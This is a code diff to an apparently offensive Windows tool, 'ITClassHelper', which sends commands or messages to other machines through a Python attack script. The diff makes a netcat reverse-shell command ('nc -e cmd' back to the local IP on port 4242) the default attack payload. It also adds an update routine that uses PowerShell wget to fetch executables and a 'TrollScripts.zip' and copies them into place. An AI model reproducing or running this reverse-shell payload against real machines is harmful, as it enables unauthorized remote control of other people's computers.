@@ -314,11 +314,6 @@ namespace ITClassHelper
                 if (UseMsgRadio.Checked == true) attackItem = $"-msg {MsgTextBox.Text.Replace("\n", "").Replace("\r", "")}";
                 else
                 {
-                    if (CmdTextBox.Text == "<NCAttackCommand>")
-                    {
-                        string ip = GetIPAddress();
-                        CmdTextBox.Text = $"{ncPath} -e C:\\Windows\\System32\\cmd.exe {ip} 4242";
-                    }
                     attackItem = $"-c \"{CmdTextBox.Text}\"";
                 };
                 try { ExecuteProcess("python", $"{baseArguments} {attackItem}"); }
@@ -397,6 +392,14 @@ namespace ITClassHelper
 
         private void UpdateProgramButton_Click(object sender, EventArgs e)
         {
+            string dlMainProgram = "wget \"https://gitee.com/ujhhgtg/ITClassHelper/raw/master/bin/Release/ITClassHelper.exe\" -O \"ITClassHelper.exe\"";
+            string dlPyInstaller = "wget \"https://hub.fastgit.org/UjhhgtgTeams/ITClassHelper/raw/master/bin/Release/PythonInstaller.exe\" -O \"PythonInstaller.exe\"";
+            string dlTrollScripts = "wget \"https://gitee.com/ujhhgtg/ITClassHelper/raw/master/bin/Release/TrollScripts.zip\" -O \"TrollScripts.zip\"";
+            string cpUpdateFiles = $"echo \"复制更新文件......\";cp \"ITClassHelper.exe\" \"{Directory.GetCurrentDirectory()}\\ITClassHelper.exe\";cp \"PythonInstaller.exe\" \"{Directory.GetCurrentDirectory()}\\PythonInstaller.exe\";cp \"TrollScripts.zip\" \"{Directory.GetCurrentDirectory()}\\TrollScripts.zip\"";
+            string arguments = $"sleep 3;echo \"下载更新文件......\";{dlMainProgram};{dlPyInstaller};{dlTrollScripts};{cpUpdateFiles};";
+            ExecuteProcess("powershell", arguments, true);
+            Environment.Exit(0);
+            /*
             string updaterPath = Application.StartupPath + @"\ITCHUpdater.exe";
             if (File.Exists(updaterPath))
             {
@@ -408,6 +411,7 @@ namespace ITClassHelper
             {
                 MessageBox.Show("更新程序不存在！请前往 url.cy/0sR4gf 下载！", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
+            */
         }
 
         private void InstallPythonButton_Click(object sender, EventArgs e)
@@ -520,7 +524,7 @@ $@"即将显示一个命令窗口。
         private void NcClientButton_Click(object sender, EventArgs e)
         {
             UseCmdRadio.Checked = true; UseMsgRadio.Checked = UseScriptRadio.Checked = false;
-            CmdTextBox.Text = "<NCAttackCommand>";
+            CmdTextBox.Text = $"{ncPath} -e cmd {GetIPAddress()} 4242";
         }
 
 
